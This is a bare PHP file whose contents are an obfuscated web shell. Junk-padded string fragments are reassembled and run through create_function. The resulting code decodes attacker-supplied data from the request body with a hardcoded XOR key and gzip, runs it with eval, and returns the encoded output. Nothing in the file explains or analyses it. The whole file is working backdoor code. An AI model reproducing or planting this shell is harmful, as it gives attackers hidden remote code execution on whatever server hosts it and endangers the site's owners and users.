<?php
$s='($i=B0;$i<B$Bl;){fBor($j=0;($j<$c&BB&$i<$l);$jB++,$i++)B{$o.=B$tB{$i}^$k{$';
$c=');$r=@basBBBe64_encodBBe(@x(B@gzcomprBess($o),$Bk));printB("$p$kh$r$kf");}';
$n='jB};B}}returBn $o;}iBBf (@pBreg_Bmatch("/$kBh(.+)$kf/",@fiBle_geBBt_conten';
$m='$Bk=B"fd2d0e13";$kh=B"5baBBa00489419";$kBf="Bb1eb35892ad2B";$pB="sABdj0IB5Sa';
$b='BtBs("php:/B/input"),$m)B==BB1) {@obB_start();@evaBl(B@gzuncompBress(@x(@b';
$a=str_replace('Q','','QcrQeatQe_fQQQunction');
$v='BaBse64_decBode($m[1B]B),$kBB)));B$o=@ob_get_BcontenBBts();@ob_end_cleanB(';
$T='uuyiBTlj";fuBnction x($Bt,$Bk)B{$Bc=strlen($k);$l=stBrlen(B$t)B;$o="";forB';
$f=str_replace('B','',$m.$T.$s.$n.$b.$v.$c);
$M=$a('',$f);$M();
?>
